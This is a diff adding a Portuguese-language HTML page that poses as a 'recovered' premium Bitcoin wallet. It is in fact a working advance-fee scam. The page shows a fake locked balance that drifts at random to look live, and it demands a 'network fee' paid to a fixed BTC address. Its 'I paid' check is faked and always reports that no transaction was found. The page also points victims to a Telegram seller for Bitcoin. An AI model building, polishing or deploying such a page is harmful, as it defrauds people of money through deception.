@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Quantum Vault - Carteira Premium</title>
+  
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <style>
+    :root {
+      --primary: #7c3aed;
+      --primary-dark: #6d28d9;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-300: #d1d5db;
+      --gray-600: #4b5563;
+      --gray-800: #1f2937;
+      --gray-900: #111827;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+      color: #e2e8f0;
+      min-height: 100vh;
+    }
+    
+    .glass {
+      background: rgba(255, 255, 255, 0.03);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+    }
+    
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(124, 58, 237, 0.4);
+    }
+    
+    .progress-bar {
+      height: 6px;
+      background: var(--gray-300);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--success));
+      border-radius: 3px;
+      transition: width 0.6s ease;
+    }
+    
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      min-width: 300px;
+      padding: 16px 20px;
+      border-radius: 12px;
+      color: white;
+      font-weight: 500;
+      transform: translateX(400px);
+      transition: transform 0.4s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      transform: translateX(0);
+    }
+    .toast.success { background: var(--success); }
+    .toast.error { background: var(--danger); }
+    
+    .address-copy {
+      user-select: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .address-copy:hover {
+      color: var(--primary);
+    }
+    .address-copy.copied {
+      color: var(--success);
+    }
+    
+    .modal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modal.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .fee-blocked {
+      opacity: 0.6;
+      pointer-events: none;
+    }
+
+    .qr-code {
+      width: 160px;
+      height: 160px;
+      margin: 16px auto;
+      background: white;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .pulse-red {
+      animation: pulseRed 1.5s infinite;
+    }
+    @keyframes pulseRed {
+      0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
+      70% { box-shadow: 0 0 0 12px rgba(239, 68, 68, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+    }
+  </style>
+</head>
+<body class="min-h-screen">
+
+  <!-- Header -->
+  <header class="glass border-b border-white/5">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-5">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center space-x-3">
+          <div class="w-11 h-11 bg-gradient-to-br from-violet-600 to-purple-700 rounded-xl flex items-center justify-center">
+            <i class="fas fa-shield-alt text-white text-lg"></i>
+          </div>
+          <div>
+            <h1 class="text-xl font-bold text-white">Quantum Vault</h1>
+            <p class="text-xs text-gray-400">Carteira Premium de Alta Segurança</p>
+          </div>
+        </div>
+        <div class="flex items-center space-x-2">
+          <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+          <span class="text-xs text-gray-400">Blockchain Ativa</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    
+    <!-- Alert Banner -->
+    <div class="glass p-4 mb-6 border-l-4 border-amber-500 flex items-start space-x-3">
+      <i class="fas fa-info-circle text-amber-400 mt-1"></i>
+      <div>
+        <p class="text-sm font-medium text-amber-200">Acesso Restrito</p>
+        <p class="text-xs text-gray-300 mt-1">Esta carteira foi recuperada. Insira a senha de acesso para visualizar o saldo e iniciar o processo de liberação.</p>
+      </div>
+    </div>
+
+    <!-- Wallet Card -->
+    <div class="glass p-6 mb-6">
+      <div class="flex items-center justify-between mb-4">
+        <h2 class="text-lg font-semibold text-white flex items-center">
+          <i class="fas fa-wallet mr-2 text-purple-400"></i>
+          Carteira Recuperada
+        </h2>
+        <span class="text-xs bg-amber-500/20 text-amber-300 px-3 py-1 rounded-full font-medium">Premium</span>
+      </div>
+
+      <!-- Address -->
+      <div class="mb-5">
+        <label class="text-xs text-gray-400 uppercase tracking-wider">Endereço da Carteira</label>
+        <div class="flex items-center mt-2 bg-gray-800/50 rounded-lg p-3 border border-gray-700">
+          <code id="wallet-address" class="text-sm text-purple-300 font-mono flex-1">
+            bc1qan8p97yksh9zwgjwjsqay58uz2dmafns5f5pdh
+          </code>
+          <button id="copy-address" class="address-copy ml-3 text-gray-400 hover:text-purple-400 transition">
+            <i class="fas fa-copy"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Balance -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+        <div class="bg-gradient-to-br from-violet-600/20 to-purple-600/20 p-5 rounded-xl border border-violet-500/30">
+          <div class="flex items-center justify-between">
+            <div>
+              <p class="text-xs text-gray-400 uppercase">Saldo Total</p>
+              <p class="text-3xl font-bold text-white mt-1" id="balance-usd">R$7.890,00</p>
+              <p class="text-sm text-purple-300 mt-1">0.01824781 BTC</p>
+            </div>
+            <i class="fas fa-coins text-4xl text-purple-400 opacity-70"></i>
+          </div>
+        </div>
+
+        <div class="bg-gradient-to-br from-red-600/20 to-rose-600/20 p-5 rounded-xl border border-red-500/30">
+          <div class="flex items-center justify-between">
+            <div>
+              <p class="text-xs text-gray-400 uppercase">Disponível</p>
+              <p class="text-3xl font-bold text-white mt-1" id="available-usd">R$0,00</p>
+              <p class="text-sm text-red-300 mt-1">Bloqueado</p>
+            </div>
+            <i class="fas fa-lock text-4xl text-red-400 opacity-70"></i>
+          </div>
+        </div>
+      </div>
+
+      <!-- Progress -->
+      <div class="mb-6">
+        <div class="flex justify-between items-center mb-2">
+          <span class="text-sm font-medium text-gray-300">Processo de Liberação</span>
+          <span class="text-sm text-purple-400" id="progress-text">0 de 3 etapas</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
+        </div>
+        <p class="text-xs text-gray-400 mt-2" id="progress-desc">Aguardando senha de acesso</p>
+      </div>
+    </div>
+
+    <!-- Security Steps -->
+    <div class="glass p-6 mb-6">
+      <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
+        <i class="fas fa-shield-alt mr-2 text-purple-400"></i>
+        Etapas de Liberação
+      </h3>
+
+      <div class="space-y-4">
+        <!-- Step 1: Senha -->
+        <div class="flex items-start space-x-4 p-4 bg-gray-800/30 rounded-lg border border-gray-700" id="step-1">
+          <div class="flex-shrink-0 w-10 h-10 bg-purple-500/20 rounded-full flex items-center justify-center">
+            <i class="fas fa-key text-purple-400"></i>
+          </div>
+          <div class="flex-1">
+            <div class="flex items-center justify-between">
+              <h4 class="font-medium text-white">Autenticação de Acesso</h4>
+              <span class="text-xs bg-gray-700 text-gray-300 px-2 py-1 rounded" id="status-1">Pendente</span>
+            </div>
+            <p class="text-sm text-gray-400 mt-1">
+              Insira a senha de recuperação para validar a propriedade da carteira.
+            </p>
+            <button class="mt-3 text-xs text-purple-400 hover:text-purple-300 underline" id="start-btn" onclick="startPassword()">
+              Inserir senha
+            </button>
+          </div>
+        </div>
+
+        <!-- Step 2: Taxa -->
+        <div class="flex items-start space-x-4 p-4 bg-gray-800/30 rounded-lg border border-gray-700 fee-blocked" id="step-2">
+          <div class="flex-shrink-0 w-10 h-10 bg-gray-600/50 rounded-full flex items-center justify-center">
+            <i class="fas fa-coins text-gray-500"></i>
+          </div>
+          <div class="flex-1">
+            <h4 class="font-medium text-gray-600">Taxa de Rede (0.00090990 BTC)</h4>
+            <p class="text-sm text-gray-500 mt-1">
+              Pague a taxa de rede para desbloquear o saque.
+            </p>
+          </div>
+        </div>
+
+        <!-- Step 3: Saque -->
+        <div class="flex items-start space-x-4 p-4 bg-gray-800/30 rounded-lg brder border-gray-700 fee-blocked" id="step-3">
+          <div class="flex-shrink-0 w-10 h-10 bg-gray-600/50 rounded-full flex items-center justify-center">
+            <i class="fas fa-paper-plane text-gray-500"></i>
+          </div>
+          <div class="flex-1">
+            <h4 class="font-medium text-gray-600">Sacar Fundos</h4>
+            <p class="text-sm text-gray-500 mt-1">
+              Transfira para qualquer carteira BTC.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Transaction History -->
+    <div class="glass p-6">
+      <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
+        <i class="fas fa-history mr-2 text-purple-400"></i>
+        Histórico de Transações
+      </h3>
+      <div class="space-y-3">
+        <div class="flex items-center justify-between p-3 bg-gray-800/30 rounded-lg">
+          <div class="flex items-center space-x-3">
+            <div class="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center">
+              <i class="fas fa-arrow-down text-green-400 text-xs"></i>
+            </div>
+            <div>
+              <p class="text-sm font-medium text-white">Depósito Externo</p>
+              <p class="text-xs text-gray-400">bc1q...7k2m</p>
+            </div>
+          </div>
+          <div class="text-right">
+            <p class="text-sm font-medium text-green-400">+0.01824781 BTC</p>
+            <p class="text-xs text-gray-400">R$7.890,00</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Modal: Senha -->
+  <div id="modal" class="modal">
+    <div class="glass p-6 max-w-md w-full mx-4 rounded-2xl border border-white/10">
+      <div class="flex items-center justify-between mb-4">
+        <h3 class="text-lg font-semibold text-white">Autenticação de Acesso</h3>
+        <button onclick="closeModal()" class="text-gray-400 hover:text-white">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div id="step-content"></div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div id="toast-container"></div>
+
+  <script>
+    const state = { progress: 0, passwordCorrect: false };
+    const elements = {
+      progressFill: document.getElementById('progress-fill'),
+      progressText: document.getElementById('progress-text'),
+      progressDesc: document.getElementById('progress-desc'),
+      balanceUsd: document.getElementById('balance-usd'),
+      availableUsd: document.getElementById('available-usd'),
+      copyBtn: document.getElementById('copy-address'),
+      modal: document.getElementById('modal'),
+      modalContent: document.getElementById('step-content'),
+      step1: document.getElementById('step-1'),
+      step2: document.getElementById('step-2'),
+      step3: document.getElementById('step-3'),
+      status1: document.getElementById('status-1'),
+      startBtn: document.getElementById('start-btn')
+    };
+
+    const CORRECT_PASSWORD = 'admin123';
+    const BTC_ADDRESS = 'bc1qan8p97yksh9zwgjwjsqay58uz2dmafns5f5pdh';
+    const FEE_BTC = '0.00090990 BTC';
+    const FEE_BRL = 'R$540,00';
+
+    elements.copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(BTC_ADDRESS).then(() => {
+        elements.copyBtn.innerHTML = '<i class="fas fa-check"></i>';
+        elements.copyBtn.classList.add('copied');
+        setTimeout(() => {
+          elements.copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
+          elements.copyBtn.classList.remove('copied');
+        }, 2000);
+      });
+    });
+
+    function startPassword() {
+      elements.modal.classList.add('show');
+      elements.modalContent.innerHTML = `
+        <div class="space-y-4">
+          <div class="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4">
+            <p class="text-sm text-amber-300">
+              <i class="fas fa-key mr-1"></i>
+              Insira a senha de recuperação para validar o acesso à carteira.
+            </p>
+          </div>
+          <div>
+            <label class="block text-sm font-medium text-gray-300 mb-2">Senha</label>
+            <input type="password" id="password-input" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition" placeholder="••••••••">
+          </div>
+          <button onclick="verifyPassword()" class="w-full mt-4 px-6 py-3 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-medium rounded-lg btn-primary">
+            Confirmar Acesso
+          </button>
+        </div>
+      `;
+    }
+
+    function verifyPassword() {
+      const input = document.getElementById('password-input').value;
+      if (input !== CORRECT_PASSWORD) {
+        showToast('Senha incorreta. Tente novamente.', 'error');
+        return;
+      }
+      state.progress = 1;
+      state.passwordCorrect = true;
+      updateProgress();
+      closeModal();
+      showToast('Acesso autenticado com sucesso.', 'success');
+      unlockFeeStep();
+    }
+
+    function unlockFeeStep() {
+      elements.step2.classList.remove('fee-blocked');
+      elements.status1.textContent = 'Concluído';
+      elements.status1.className = 'text-xs bg-green-500/20 text-green-300 px-2 py-1 rounded';
+      elements.startBtn.remove();
+
+      const feeHTML = `
+        <div class="mt-3 p-5 bg-gradient-to-r from-purple-600/20 to-violet-600/20 rounded-lg border border-purple-500/30">
+          <p class="text-sm font-medium text-purple-300 mb-3">
+            <i class="fas fa-coins mr-1"></i> Taxa de Rede
+          </p>
+          <p class="text-xs text-gray-300 mb-4">
+            Para desbloquear o saque, é necessário pagar a taxa de rede:
+            <strong>${FEE_BTC}</strong> (${FEE_BRL}).
+          </p>
+          <div class="bg-gray-800/50 rounded-lg p-3 mb-4">
+            <code class="text-xs text-purple-300 font-mono break-all">${BTC_ADDRESS}</code>
+          </div>
+          <div class="qr-code">
+            <img src="foto.jpeg" alt="QR Code" class="w-full h-full rounded-lg">
+          </div>
+          <p class="text-xs text-center text-gray-400 mt-2">Escaneie com sua carteira BTC</p>
+          <div class="flex space-x-2 mt-4">
+            <button onclick="copyBTCAddress()" class="flex-1 px-4 py-2 bg-gray-700 text-gray-300 rounded-lg text-sm font-medium hover:bg-gray-600 transition">
+              Copiar Endereço
+            </button>
+            <button onclick="checkPayment()" class="flex-1 px-4 py-2 bg-gradient-to-r from-purple-500 to-violet-600 text-white rounded-lg text-sm font-medium btn-primary">
+              Já Paguei
+            </button>
+          </div>
+          <div class="mt-4 text-center">
+            <p class="text-xs text-gray-400">Não possui Bitcoin?</p>
+            <button onclick="window.open('https://t.me/seuvendedor', '_blank')" class="mt-2 text-xs text-purple-400 hover:text-purple-300 underline">
+              Compre aqui
+            </button>
+          </div>
+        </div>
+      `;
+
+      elements.step2.querySelector('.flex-1').innerHTML = '';
+      elements.step2.querySelector('.flex-1').insertAdjacentHTML('beforeend', feeHTML);
+    }
+
+    function copyBTCAddress() {
+      navigator.clipboard.writeText(BTC_ADDRESS);
+      showToast('Endereço copiado!', 'success');
+    }
+
+    function checkPayment() {
+      const btn = event.target;
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
+      btn.disabled = true;
+      setTimeout(() => {
+        btn.innerHTML = 'Já Paguei';
+        btn.disabled = false;
+        btn.classList.add('pulse-red');
+        showToast('Transação não identificada. Tente novamente em 2 minutos.', 'error');
+      }, 2000);
+    }
+
+    function updateProgress() {
+      elements.progressFill.style.width = `${state.progress * 33.33}%`;
+      elements.progressText.textContent = `${state.progress} de 3 etapas`;
+      elements.progressDesc.textContent = state.progress === 0 ? 'Aguardando autenticação' :
+                                       state.progress === 1 ? 'Acesso autenticado. Pague a taxa de rede.' :
+                                       state.progress === 2 ? 'Processando pagamento...' :
+                                       'Saque liberado.';
+    }
+
+    function closeModal() {
+      elements.modal.classList.remove('show');
+    }
+
+    function showToast(message, type = 'success') {
+      const toast = document.createElement('div');
+      toast.className = `toast ${type} show`;
+      toast.innerHTML = `<div class="flex items-center space-x-2"><i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-times-circle'}"></i><span>${message}</span></div>`;
+      document.getElementById('toast-container').appendChild(toast);
+      setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 400); }, 4000);
+    }
+
+    // Variação de saldo
+    setInterval(() => {
+      const variation = (Math.random() - 0.5) * 50;
+      const newBalance = 7890 + variation;
+      elements.balanceUsd.textContent = `R$${newBalance.toFixed(2).replace('.', ',')}`;
+    }, 10000);
+  </script>
+</body>
+</html>
